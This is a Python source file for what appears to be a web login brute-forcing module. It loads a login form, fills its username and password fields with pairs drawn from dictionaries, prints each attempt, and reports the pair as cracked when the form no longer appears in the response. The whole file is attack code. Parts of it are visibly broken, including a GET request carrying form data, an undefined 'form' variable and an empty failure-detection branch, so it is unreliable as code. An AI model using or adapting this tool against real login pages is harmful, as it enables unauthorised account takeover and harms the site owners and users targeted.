
import requests
from urllib.parse import urlencode

from units.http.tools import HTML
from modules.dictionary import Dictionary


class Post:

    def __init__(self, unit):
        self.unit = unit

    def crack(self, dictionaries):

        print('[<#########>] {0}'.format(self.unit.task))

        print('[COMPLEMENT] {0} - {1}'.format(self.unit.url, self.unit.complements))

        attrs = self.unit.task['attrs']

        if 'form' not in attrs:
            return {'status':-1, 'msg':'No "form" attribute'}

        if ('session' in attrs) and not attrs['session']:
            requester = requests
        else:
            attrs['session'] = True
            requester = requests.Session()

        # First request to take all info we need to continue.
        response = None
        if attrs['session'] or ('index' in attrs['form']):
            request = {'method':'get', 'url':self.unit.url}
            request.update(self.unit.complements)
            response = requester.request(**request)

        # Get indexed form
        if 'index' in attrs['form']:
            html = HTML(response.text)
            login_form = html.get_login_forms()[attrs['form']['index']]
        else:
            login_form = attrs['form']

        print('[cracking.attrs] {0}'.format(attrs))

        if not (('usr_field' in login_form) and ('pwd_field' in login_form)):
            return {'status':-2, 'msg':'Incomplete form tag information'}

        # Start cracking
        request = {'method':'get', 'url':self.unit.url, 'data':{}}
        request.update(self.unit.complements)
        if 'fields' in login_form:
            request['data'].update(login_form['fields'])

        for dictionary in dictionaries:
            for username, password in Dictionary(**dictionary).pairs():
                print('[http] Forcing Username: {0} - Password: {1}'.format(username, password))

                request['data'][login_form['usr_field']] = username
                request['data'][login_form['pwd_field']] = password

                response = requester.request(**request)
                html = HTML(response.text)

                # Detect if the login was successful
                if 'fail' in attrs:
                    # This will be a complex structure
                    pass
                else:
                    if login_form not in html:
                        self.unit.success({'username':username, 'password':password},
                                          {'data':request['data']})

                if ('reload' in attrs['form']) and (attrs['form']['reload']):
                    request['data'] = dict([(inp.attrs['name'], inp.attrs['value']) 
                                            for inp in form.find_all('input', {'type':'hidden'})])

        return {'status':0}